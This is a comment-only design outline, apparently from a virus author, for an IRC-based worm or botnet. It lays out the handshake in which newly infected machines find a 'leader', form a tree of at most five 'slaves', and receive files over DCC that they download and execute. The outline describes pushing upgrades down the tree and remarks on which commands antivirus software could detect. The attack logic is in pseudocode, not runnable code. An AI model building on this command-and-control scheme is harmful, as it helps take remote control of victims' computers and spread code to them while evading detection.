; Main script, establich the contact between the new viruses.
;
; What happens when a new virus connects

; Step 1. On connect.
; SEND Nickname
; USER Ident . . :Realname

; Step 2. When connected
; Check if leader is online

; Step 3. If Leader is offline
; New leader is God
; Goto step 2

; Step 4. If leader is online
; Send "Hello master"

; Step 5. At Reply = "Hello child"
; Send "Do you have place for me?"

; Step 6. At Reply = "No, ask X"
; Change Leader to X
; Goto step 4

; Step 7. At Reply = "SEND: X"
; Check if file X exist
; If file doesnt exist, send "DCC X"

; Step 8. At Reply = 01,"DCC"
; Recieve the file and execute it



; What happens at the Leader side of the connection (the virus that is
; connected to the newly connected virus)

; Step 11. At Recieved = "Hello master"
; Send "Hello child"

; Step 12. At Recieved = "Do you have place for me?"
; Look how many slaves that it currently has

; Step 13. If Slave list if full (more then five slaves)
; Send "No, ask SlaveX"

; Step 14. If slave list isnt full
; Add new virus to slave list
; Send list of files

; Step 15. At Recieved = "DCC X"
; Open a DCC connection and send a CTCP DCC reply to virus

; This is the basics for a connection, if we want to upgrade the virus we
; just DCC it a file and it will download it and execute it. This virus will
; then send this program to every new virus at Step 14. These viruses will
; also send it further, so we get a whole branch that all has this program.

;                                               God
;                                          1 ( 2 3 4 5 )
; I DCC a new file to this virus ->  1 ( 2 3 4 5 )
; All these will have the file   1 2 3 4 5
; too if they connected to IRC
; after i DCC'ed the new program


; The viruses regulary check to see if all slaves and its leader is online
; if the leader is gone it goes to step 3. If a slave is missing then it is
; deleted from the slave list.


; commands marked with three stars (***) are considered dangerous in the way
; that it would be easy for the AV's to find all viruses. Delete for less fun
; and more security
